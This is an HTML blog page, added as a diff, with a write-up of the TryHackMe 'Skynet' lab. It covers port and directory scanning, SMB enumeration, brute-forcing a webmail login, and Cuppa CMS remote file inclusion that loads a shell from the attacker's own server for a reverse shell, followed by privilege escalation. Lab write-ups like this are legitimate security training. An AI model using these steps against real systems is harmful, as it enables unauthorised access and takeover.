@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+   <!-- Bootstrap CSS -->
+   <link
+   href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+   rel="stylesheet"
+   integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+   crossorigin="anonymous"
+ />
+ <link rel="preconnect" href="https://fonts.googleapis.com" />
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+ <!-- <link rel="stylesheet" href="/assets/css/thm.css" /> -->
+ <link rel="stylesheet" href="/assets/css/style.css" />
+
+   <title>Skynet | Tryhackme</title>
+</head>
+<body>
+   <nav>
+      <ul>
+        <li style="float:left"><a href="/"><h4>xf0lt</h4></a></li>
+        <li><a href="/posting/about.html">About</a></li>
+        <li><a href="/posting/post.html">Achive</a></li>
+      </ul>
+    </nav>
+   
+    <div class="container">
+         <h2><a class="link" href="https://tryhackme.com/room/skynet">Skynet | Tryhackme</a></h2><br>
+
+         <img class="img-head" src="/assets/images/skynet.jpeg" width=400px alt="xf0lt skynet tryhackme"> <br> <br>
+
+
+         <h3 class="warning">DISCLAIMER</h3>
+         <blockquote>
+            <p>
+               <strong>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.</strong>
+            </p>
+         </blockquote><br>
+
+         
+         <p>hello, here I will try to complete the skinet room in various ways that I have learned from the beginning, if there are similarities in the processing technique, maybe it's just a coincidence and the best technique for completing this machine, without much ado, let's hack this machine...</p>
+         <p>First I checked the ip given by tryhackme in the browser and we saw like a search engine similar to goole or other search engines.</p><br>
+
+         <h2 class="scope">WEBSITE</h2><br>
+
+         <img src="/assets/images/skynet/web.png" width=760px alt="skynet tryhackme writeup"><br><br>
+
+         <p>here I am trying to bruteforce a directory using gobuster, meanwhile I am doing a port scan using nmap. here I found an interesting directory that is /squirrelmail</p>
+
+         <img src="/assets/images/skynet/gobuster.png" width=760px alt="skynet tryhackme writeup root"><br><br>
+
+         <h2 class="scope">PORT SCANING</h2>
+
+         <img src="/assets/images/skynet/nmap.png" width=760px alt="writeup skynet tryhackme"><br><br>
+
+         <p>we almost forgot that earlier we were doing a port scan with nmap, let's see the results of our scan earlier. and here we can see some open ports...</p>
+         
+         <dd>- 11/ssh</dd>
+         <dd>- 80/http</dd>
+         <dd>- 100/newacct</dd>
+         <dd>- 110/pop 3</dd>
+         <dd>- 139/netbios-ssn</dd>
+         <dd>- 445/netbios-ssn</dd>
+         <dd>- 143/imap</dd>
+
+         <p>here I am interested in 2 ports 139, 445 you can see there is a samba server, so I immediately checked the host list using the samba client with the command below</p>
+   
+         <h2 class="scope">ENUMERATION</h2>
+
+         <img src="/assets/images/skynet/smbclinet.png" width=760px alt="writeup tryhackme skynet"><br><br>
+
+         <p>then I checked the directory, there is one file and one folder which contains 3 log.txt files so I try to take all the files that are there</p>
+
+         <img src="/assets/images/skynet/gettxt.png" width=760px alt="writeup tryhackme skynet"> <br> <br>
+
+         <img src="/assets/images/skynet/gettxt2.png" width=760px alt="writeup tryhackme skynet"> <br><br>
+
+         <p>after I get all the files here I want to see all the contents of the files that I got, are there any files that are important to analyze or are only empty files saved. it turned out that there were only two files containing important content, the files log1.txt and attention.txt</p>
+
+         <img src="/assets/images/skynet/wordlists.png" width=760px alt="tryhackme writeup skynet"><br><br>
+
+         <p>in that file I assume as a password wordlist. because I don't know the username for samba so I did the enumeration using enum4linux and I got the username</p> 
+
+         <img src="/assets/images/skynet/username.png" width=760px alt="tryhackme write up skynet"> <br><br>
+
+         <p>then I logged in on the squirrelmail login page using the username and password I tried the default admin failed. so here I tried to login with the same thing but here I used burpsuite to see the response I got. here I get a message like below. login</p>
+
+         <img src="/assets/images/skynet/burpsuite.png" width=760px alt="skynet writeup tryahckme"> <br><br>
+
+         <img src="/assets/images/skynet/error.png" width=760px alt="skynet writeup tyhackme"> <br><br>
+
+         <p>then the next step I tried to membrutforce login page with the command below, and I managed to find the login password. I got the log1.txt file earlier when I logged in as anonymous.</p>
+
+
+         <h2 class="scope">BRUTEFORCE</h2>
+
+
+         <img src="/assets/images/skynet/hydra.png" width=760px alt="skynet writeup tryhackme"><br><br>
+
+         <p>now we have logged in and can see all the contents of existing files or messages</p>
+
+         <img src="/assets/images/skynet/login.png" width=760px alt="skynet tryhackme writeup"> <br><br>
+
+         <p>here I am interested to look at the top file and I seem to find a password for a samba user.</p>
+
+         <img src="/assets/images/skynet/loginpws.png" width=760px alt="skynet tryhackme tryhackme"> <br><br>
+
+         <p>then I tried logging in using the milesdyson user on the milesdyson file share using the password I got earlier and it worked. here I found the notes folder and I took the .txt file which is in the folder as below</p>
+
+         <img src="/assets/images/skynet/smbusers.png" width=760px alt="skynet tryhackme writeup"> <br><br>
+
+         <img src="/assets/images/skynet/getimpt.png" width=760px alt="tryhackme skinet writeup"><br><br>
+
+         <p>After I get an important file, I check the contents of the file, it turns out to contain a task or some kind of secret directory</p>
+
+         <img src="/assets/images/skynet/screte.png" width=760px alt="writeup tryhackme skynet"><br><br>
+
+         <p>I checked the browser and this is a frustrating result, but it's okay let's try to brute force directories using gobuster</p>
+
+         <img src="/assets/images/skynet/miled.png" width=760px alt="skynet tryhackme writeup"> <br><br>
+
+         <p>When I bruteforce a directory I only find one directory and then I check it in the browser</p>
+
+         <img src="/assets/images/skynet/brutescret.png" width=760px alt="skynet writeup tryhackme"> <br><br>
+
+         <p>damn.. There is a CMS login page, when I found the CMS name, Cuppa</p>
+
+         <h2 class="scope">LOGIN</h2>
+
+         <img src="/assets/images/skynet/cupa.png" width=760px alt="skynet writeup tryhackme"><br><br>
+
+         <p>Then I tried to search for CMS vulnerabilities using SearchSploit and I found this</p>
+
+         <img src="/assets/images/skynet/searcupa.png" width=760px alt="skynet writeup xploit"> <br><br>
+
+         <p>Immediately I tried to check what the contents of file 25971.txt</p>
+
+         <img src="/assets/images/skynet/paylod.png" width=760px alt="skynet write up tryhackme"><br><br>
+
+         <p>then I tried to create a shell to try shell access with comand as below</p>
+         
+         <pre><span> 
+            http://10.10.27.216/scret/administrator/alerts/alertConfigField.php?urlConfig=http:/ip:port/shell.php
+         </span></pre><br>
+         
+         
+       <p> Before doing this, turn on Pyhton Server python3 -m http.server then use netcat as listener and booom!!!!!</p>
+
+       <img src="/assets/images/skynet/nc.png" width=760px alt="skinet writeup tryhackme"> <br><br>
+
+       <p>Then I use linpeas to find vulnerabilities in the kernel, here I put linpeas in the /tmp directory. 
+       Then I use linpeas to find vulnerabilities in the kernel, here I put linpeas in the /tmp directory. </p>
+   
+       <img src="/assets/images/skynet/chm.png" width=760px alt="skynet tryhackme writeup"><br><br>
+       
+
+       <h2 class="scope">ROOT</h2>
+
+       <p>here i found the logrotate kernel</p>
+
+       <img src="/assets/images/skynet/kern.png" width=760px alt="skynet tryhackme writeup"><br><br>
+
+       
+      <p>I tried to search with searchploit after I found it I moved it to my local directorate</p>
+
+       <img src="/assets/images/skynet/ccc.png" width=760px alt="skynet tryhackme writeup"><br><br>
+
+       <p>After that I try to send it to the victim's machine, don't forget to turn on the Pyhthon server, after you get it don't forget to compile and booom!!!!!</p>
+
+       <img src="/assets/images/skynet/root.png" width=760px alt="skynet tryhackme writeup"> <br><br>
+
+   <h2 class="rooted">ROOTED</h2>
+
+      </section>
+    </div>
+
+</body>
+</html>
